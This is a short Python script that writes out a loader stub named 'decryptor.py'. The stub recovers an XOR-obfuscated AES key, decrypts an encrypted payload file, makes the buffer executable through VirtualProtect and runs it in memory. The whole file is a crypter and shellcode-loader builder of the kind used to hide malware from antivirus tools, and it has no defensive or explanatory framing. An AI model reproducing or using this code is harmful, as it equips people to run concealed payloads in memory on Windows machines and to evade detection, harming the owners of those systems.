import binascii

STUB_TEMPLATE = """
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import ctypes
import binascii

def xor_decrypt(data, key):
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

# Obfuscated Components
obfuscated_key = binascii.unhexlify("{obfuscated_key_hex}")
xor_key = binascii.unhexlify("{xor_key_hex}")

# Decrypt AES Key
aes_key = xor_decrypt(obfuscated_key, xor_key)

# Decrypt Payload
with open("{encrypted_file}", "rb") as f:
    encrypted_data = f.read()
iv = encrypted_data[:16]
ciphertext = encrypted_data[16:]
cipher = AES.new(aes_key, AES.MODE_CBC, iv)
decrypted = unpad(cipher.decrypt(ciphertext), AES.block_size)

# Execute in Memory
buffer = ctypes.create_string_buffer(decrypted)
ctypes.windll.kernel32.VirtualProtect(buffer, len(decrypted), 0x40, ctypes.byref(ctypes.c_long(1)))
func = ctypes.cast(buffer, ctypes.CFUNCTYPE(None))
func()
"""

def generate_decryptor(encrypted_file, obfuscated_key_hex, xor_key_hex):
    with open("decryptor.py", "w") as f:
        f.write(STUB_TEMPLATE.format(
            obfuscated_key_hex=obfuscated_key_hex,
            xor_key_hex=xor_key_hex,
            encrypted_file=encrypted_file
        ))
    print("[+] Decryptor saved as 'decryptor.py'")